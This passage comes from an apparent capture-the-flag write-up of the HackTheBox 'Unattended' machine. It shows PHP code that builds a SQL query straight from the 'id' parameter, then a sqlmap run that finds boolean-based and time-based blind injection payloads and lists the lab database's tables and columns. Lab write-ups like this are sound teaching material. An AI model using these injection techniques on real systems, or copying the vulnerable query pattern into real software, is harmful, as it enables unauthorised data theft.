	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>
<p>It defines an array called <code class="language-plaintext highlighter-rouge">valid_ids</code>, then it checks the <code class="language-plaintext highlighter-rouge">GET</code> parameter <code class="language-plaintext highlighter-rouge">id</code>, if it exists and it’s in the <code class="language-plaintext highlighter-rouge">valid_ids</code> array, it will append it to this <code class="language-plaintext highlighter-rouge">SQL</code> query : <code class="language-plaintext highlighter-rouge">SELECT name FROM idname where id = [ID HERE]</code>.<br>
To understand what’s happening in a better way let’s check the website again.<br>
<br><img src="/images/hackthebox/unattended/8.png" alt="" class="align-center"><br><br>
There are 3 pages, <code class="language-plaintext highlighter-rouge">main</code>, <code class="language-plaintext highlighter-rouge">about</code> and <code class="language-plaintext highlighter-rouge">contact</code>.  By visiting them we notice that the <code class="language-plaintext highlighter-rouge">id</code> parameter is added and each page has one of the ids we saw in the <code class="language-plaintext highlighter-rouge">php</code> code : 25 (main), 465 (about) and 587 (contact).<br>
<br><img src="/images/hackthebox/unattended/9.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/unattended/10.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/unattended/11.png" alt="" class="align-center"><br><br>
I tried adding a single quote to <code class="language-plaintext highlighter-rouge">https://www.nestedflanders.htb/index.php?id=465</code> and I got the main page instead of the about page because the query failed :
<br><img src="/images/hackthebox/unattended/12.png" alt="" class="align-center"><br><br>
When I fixed the query it worked :
<br><img src="/images/hackthebox/unattended/13.png" alt="" class="align-center"><br><br>
I started <code class="language-plaintext highlighter-rouge">sqlmap</code> to automate it and dump the database :</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">unattended</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">465</span> <span class="c1">--dump-all</span>
       <span class="n">__H__</span>
<span class="n">___</span> <span class="n">___</span> <span class="p">[</span><span class="nv">"]_____ ___ ___  {1.3.4#stable}
|_ -| . [.]     | .'| . |                                                                   
|___|_  [']_|_|_|__,|  _|                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
[*] starting @ 17:12:07 /2019-08-23/

[17:12:08] [INFO] testing connection to the target URL
[17:12:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:12:10] [INFO] testing if the target URL content is stable
[17:12:11] [INFO] target URL content is stable
[17:12:11] [INFO] testing if GET parameter 'id' is dynamic
[17:12:12] [INFO] GET parameter 'id' appears to be dynamic                
[17:12:15] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:12:16] [INFO] testing for SQL injection on GET parameter 'id'
[17:12:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:12:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="</span><span class="n">form</span><span class="nv">")
[17:12:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y 
[17:12:41] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                 
[17:12:42] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'              
[17:12:42] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:12:43] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'    
[17:12:44] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'             
[17:12:44] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                  
[17:12:45] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'            
[17:12:45] [INFO] testing 'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' 
[17:12:46] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'      
[17:12:47] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'   
[17:12:48] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'        
[17:12:49] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'        
[17:12:50] [INFO] testing 'MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:12:50] [INFO] testing 'MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:12:51] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:12:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:12:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:12:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:12:55] [INFO] testing 'MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.5 error-based - Parameter replace (EXP)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:12:56] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:12:56] [INFO] testing 'MySQL inline queries'
[17:12:56] [INFO] testing 'PostgreSQL inline queries'
[17:12:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:12:58] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (comment)'
[17:12:59] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'
[17:13:00] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP - comment)'
[17:13:00] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP)'
[17:13:01] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'
[17:13:02] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'
[17:13:03] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[17:13:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:13:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:13:04] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'
[17:13:17] [INFO] GET parameter 'id' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind' injectable 
[17:13:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:13:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:13:18] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech
nique test
[17:13:22] [INFO] target URL appears to have 1 column in query
[17:13:25] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
[17:13:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:13:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:14:05] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:14:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:14:35] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:14:48] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:15:02] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:15:16] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:15:29] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:15:44] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[17:15:59] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 296 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465' AND 6602=6602 AND 'YxJr'='YxJr

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind
    Payload: id=465' AND SLEEP(5) AND 'APKt'='APKt
---
[17:16:20] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL &gt;= 5.0.12
[17:16:20] [INFO] sqlmap will dump entries of all tables from all databases now
</span></code></pre></div></div>
<p>There are 2 databases, <code class="language-plaintext highlighter-rouge">information_schema</code> and <code class="language-plaintext highlighter-rouge">neddy</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="n">MySQL</span>
<span class="n">web</span> <span class="n">application</span> <span class="n">technology</span><span class="p">:</span> <span class="n">Nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">3</span>
<span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">sqlmap</span> <span class="n">will</span> <span class="n">dump</span> <span class="n">entries</span> <span class="k">of</span> <span class="k">all</span> <span class="n">tables</span> <span class="k">from</span> <span class="k">all</span> <span class="n">databases</span> <span class="n">now</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="k">database</span> <span class="k">names</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="k">of</span> <span class="n">databases</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">18</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">information_schema</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">neddy</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">tables</span> <span class="k">for</span> <span class="n">databases</span><span class="p">:</span> <span class="s1">'information_schema, neddy'</span>
</code></pre></div></div>
<p>We don’t need <code class="language-plaintext highlighter-rouge">information_schema</code> in anything and also dumping <code class="language-plaintext highlighter-rouge">neddy</code> with that kind of injection would take a lot of time, let’s take a look at the tables.<br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">tables</span> <span class="k">for</span> <span class="k">database</span><span class="p">:</span> <span class="s1">'neddy'</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="k">of</span> <span class="n">tables</span> <span class="k">for</span> <span class="k">database</span> <span class="s1">'neddy'</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">11</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">config</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">9</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customers</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">9</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">employees</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">filepath</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">idname</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">7</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">offices</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">orderdetails</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">orders</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">payments</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">productlines</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">products</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">columns</span> <span class="k">for</span> <span class="k">table</span> <span class="s1">'customers'</span> <span class="k">in</span> <span class="k">database</span> <span class="s1">'neddy'</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">13</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">14</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customerNumber</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customerName</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">15</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">contactLastName</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">16</span>
